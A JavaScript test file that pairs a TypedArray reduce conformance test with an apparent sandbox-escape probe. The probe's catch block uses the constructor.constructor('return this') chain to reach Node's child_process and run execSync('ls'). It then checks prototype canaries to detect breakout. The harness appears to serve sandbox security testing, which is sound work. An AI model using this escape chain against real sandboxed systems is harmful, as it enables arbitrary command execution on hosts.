try {
    testWithTypedArrayConstructors(function (TA) {
        var sample = new TA([
            42,
            43,
            44
        ]);
        var newVal = 0;
        sample.reduce(function (acc, val, i) {
            if (i > 0) {
                assert.sameValue(sample[i - 1], newVal - 1, 'get the changed value during the loop');
                assert.sameValue(Reflect.set(sample, 0, 7), true, 're-set a value for sample[0]');
            }
            assert.sameValue(Reflect.set(sample, i, newVal), true, 'set value during iteration');
            newVal++;
        }, 0);
        assert.sameValue(sample[0], 7, 'changed values after iteration [0] == 7');
        assert.sameValue(sample[1], 1, 'changed values after iteration [1] == 1');
        assert.sameValue(sample[2], 2, 'changed values after iteration [2] == 2');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}